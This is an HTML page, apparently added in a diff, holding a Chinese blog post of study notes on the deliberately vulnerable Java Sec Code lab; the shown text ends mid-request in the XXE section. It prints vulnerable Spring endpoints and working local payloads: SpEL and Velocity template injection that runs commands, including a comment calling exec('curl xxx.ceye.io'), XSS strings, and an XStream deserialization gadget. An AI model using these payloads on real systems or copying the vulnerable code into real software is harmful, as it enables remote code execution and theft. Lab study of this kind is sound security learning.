@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ShangZeng">
+
+
+
+
+
+<title>JavaSecCode学习笔记 | ShangZeng</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">ShangZeng&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">ShangZeng&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/friends">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">JavaSecCode学习笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">ShangZeng</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 14, 2020&nbsp;&nbsp;20:29:48</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/java/">java</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="什么是-Java-Sec-Code"><a href="#什么是-Java-Sec-Code" class="headerlink" title="什么是 Java Sec Code"></a>什么是 Java Sec Code</h2><p>该项目也可以叫做Java Vulnerability Code(Java漏洞代码)。</p>
+<p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md" target="_blank" rel="noopener">Java Sec Code</a>每个漏洞类型代码默认存在安全漏洞（除非本身不存在漏洞），相关修复代码在注释里。具体可查看每个漏洞代码和注释。</p>
+<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>采用了SpringBoot环境，理论上扔进IDEA就能自动加载（没有Spring安装Spring并换成阿里源）</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image.png" alt="image"></p>
+<p>登陆密码默认</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;admin123</span><br><span class="line">joychou&#x2F;joychou123</span><br></pre></td></tr></table></figure>
+
+<p>默认端口为8080，访问就可，还有一些漏洞在页面上并没有显示。</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image1.png" alt="image"></p>
+<h2 id="基础学习"><a href="#基础学习" class="headerlink" title="基础学习"></a>基础学习</h2><p>在查看代码后发现一些基本内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;appInfo          &#x2F;&#x2F;查看基本配置信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;ip&#x2F;noproxy       &#x2F;&#x2F;获取IP信息</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="IP修改"><a href="#IP修改" class="headerlink" title="IP修改"></a>IP修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;IPForge.java</span><br><span class="line">    public static String proxy(HttpServletRequest request) &#123;</span><br><span class="line">        String ip &#x3D; request.getHeader(&quot;X-Real-IP&quot;);</span><br><span class="line">        &#x2F;&#x2F;StringUtils.isNotBlank() 判断某字符串是否不为空且长度不为0且不由空白符</span><br><span class="line">        if (StringUtils.isNotBlank(ip)) &#123;</span><br><span class="line">            return ip;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; request.getRemoteAddr() 获取IP地址</span><br><span class="line">            String remoteAddr &#x3D; request.getRemoteAddr();</span><br><span class="line">            if (StringUtils.isNotBlank(remoteAddr)) &#123;</span><br><span class="line">                return remoteAddr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>结合一些其他功能可能会出现一些问题，这种问题出现在一些http参数可控导致的问题。</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image2.png" alt="image"></p>
+<h2 id="SPEL-表达式注入"><a href="#SPEL-表达式注入" class="headerlink" title="SPEL 表达式注入"></a>SPEL 表达式注入</h2><p>Spring Expression Language（简称SpEL）是spring框架的的表达式语言，其中一种简单的触发方式如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//触发方式如下</span></span><br><span class="line"><span class="comment">//spel?input=new java.lang.ProcessBuilder("calc").start()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/spel"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">spel</span><span class="params">(String input)</span></span>&#123;</span><br><span class="line">    SpelExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    Expression expression = parser.parseExpression(input);</span><br><span class="line">    <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看javaseccode代码写法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * SPEL to RCE</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;spel&#x2F;vul&#x2F;?expression&#x3D;xxx.</span><br><span class="line"> * xxx is urlencode(exp)</span><br><span class="line"> * exp: T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx.ceye.io&quot;)</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)</span><br><span class="line">public String rce(String expression) &#123;</span><br><span class="line">    ExpressionParser parser &#x3D; new SpelExpressionParser();</span><br><span class="line">    &#x2F;&#x2F; fix method: SimpleEvaluationContext</span><br><span class="line">    return parser.parseExpression(expression).getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弹出计算器,直接带入引用了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;spel&#x2F;vuln&#x2F;?expression&#x3D;T(java.lang.Runtime).getRuntime().exec(&quot;open -a Calculator&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image3.png" alt="image"></p>
+<ol>
+<li><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/" target="_blank" rel="noopener">SPEL表达式注入-入门篇</a></li>
+<li><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">由浅入深SpEL表达式注入漏洞</a></li>
+</ol>
+<h2 id="SSTI-模版注入"><a href="#SSTI-模版注入" class="headerlink" title="SSTI 模版注入"></a>SSTI 模版注入</h2><p>查看代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    @GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">    public void velocity(String template) &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">        context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">        context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut &#x3D; new StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>弹出计算器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;ssti&#x2F;velocity?template&#x3D;#set($e&#x3D;&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;open -a Calculator&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image4.png" alt="image"></p>
+<ol>
+<li><a href="https://xz.aliyun.com/t/7466" target="_blank" rel="noopener">白头搔更短，SSTI惹人心</a></li>
+</ol>
+<h2 id="URl-跳转漏洞"><a href="#URl-跳转漏洞" class="headerlink" title="URl 跳转漏洞"></a>URl 跳转漏洞</h2><p>重定向跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问页面进行跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;urlRedirect&#x2F;setHeader?url&#x3D;http:&#x2F;&#x2F;www.baidu.com </span><br><span class="line">    @RequestMapping(&quot;&#x2F;setHeader&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public static void setHeader(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); &#x2F;&#x2F; 301 redirect</span><br><span class="line">        response.setHeader(&quot;Location&quot;, url);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>302跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    response.sendRedirect(url); &#x2F;&#x2F; 302 redirect</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复方式：只进行内部跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static void forward(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String url &#x3D; request.getParameter(&quot;url&quot;);</span><br><span class="line">    &#x2F;&#x2F; ServletContext.getRequestDispatcher(String url)中的url只能使用绝对路径； </span><br><span class="line">    RequestDispatcher rd &#x3D; request.getRequestDispatcher(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        rd.forward(request, response);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="XSS-漏洞"><a href="#XSS-漏洞" class="headerlink" title="XSS 漏洞"></a>XSS 漏洞</h2><p>比较熟了不多介绍，直接看代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">    @RequestMapping(&quot;&#x2F;reflect&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public static String reflect(String xss) &#123;</span><br><span class="line">    &#x2F;&#x2F; 直接返回</span><br><span class="line">        return xss;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里还展示一种吧XSS语句带入cookie，然后在其他处调出造成XSS的可能性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;依次访问，触发XSS</span><br><span class="line">&#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;xss&#x2F;stored&#x2F;store?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">&#x2F;&#x2F;http:&#x2F;&#x2F;localhost:8080&#x2F;xss&#x2F;stored&#x2F;show</span><br><span class="line">    @RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">        return &quot;Set param into cookie&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;stored&#x2F;show&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">        return xss;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里展示的修复方式：将特殊字符转译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safe&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String safe(String xss) &#123;</span><br><span class="line">    return encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static String encode(String origin) &#123;</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&quot;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">    return origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XStreamRce-反序列化"><a href="#XStreamRce-反序列化" class="headerlink" title="XStreamRce 反序列化"></a>XStreamRce 反序列化</h2><p>XStream是一个著名的反序列化的库,查看代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; POST 请求</span><br><span class="line">@PostMapping(&quot;&#x2F;xstream&quot;)</span><br><span class="line">public String parseXml(HttpServletRequest request) throws Exception &#123;</span><br><span class="line">    &#x2F;&#x2F; 获取请求body信息</span><br><span class="line">    String xml &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">    XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">    xstream.fromXML(xml);</span><br><span class="line">    return &quot;xstream&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造请求包如下，返回信息<code>xstream</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xstream HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: JSESSIONID&#x3D;F72970816A2209BE00510D1AE0717E05; XSRF-TOKEN&#x3D;feccbe46-3c79-4ce4-932b-4ad20bab60b4; remember-me&#x3D;YWRtaW46MTYwODcwOTM4MDEyODphMmM5Yjg1NjMwZDRkOTNhYTljMWZmMzQwNDk4ZjYzYg</span><br><span class="line">Content-Length: 492</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt; &lt;!-- Proxy 动态代理，handler使用EventHandler --&gt;</span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;&#x2F;interface&gt;</span><br><span class="line">    &lt;handler class&#x3D;&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line">      &lt;target class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;command&gt;</span><br><span class="line">          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">          &lt;string&gt;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">        &lt;&#x2F;command&gt;</span><br><span class="line">      &lt;&#x2F;target&gt;</span><br><span class="line">      &lt;action&gt;start&lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;handler&gt;</span><br><span class="line">  &lt;&#x2F;dynamic-proxy&gt;</span><br><span class="line">&lt;&#x2F;sorted-set&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image5.png" alt="image"></p>
+<ol>
+<li><a href="https://www.cnblogs.com/303donatello/p/13998245.html" target="_blank" rel="noopener">CVE-2020-26217 | XStream远程代码执行漏洞</a></li>
+<li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/" target="_blank" rel="noopener">通过XStream对象反序列化的RCE</a></li>
+</ol>
+<h2 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。查看代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; XXE.java</span><br><span class="line">    &#x2F;&#x2F; POST 请求</span><br><span class="line">    @PostMapping(&quot;&#x2F;xmlReader&#x2F;vuln&quot;)</span><br><span class="line">    public String xmlReaderVuln(HttpServletRequest request) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取请求体</span><br><span class="line">            String body &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            XMLReader xmlReader &#x3D; XMLReaderFactory.createXMLReader();</span><br><span class="line">            &#x2F;&#x2F; 解析 xml</span><br><span class="line">            xmlReader.parse(new InputSource(new StringReader(body)));</span><br><span class="line">            return &quot;xmlReader xxe vuln code&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;xxe&#x2F;xmlReader&#x2F;vuln HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span 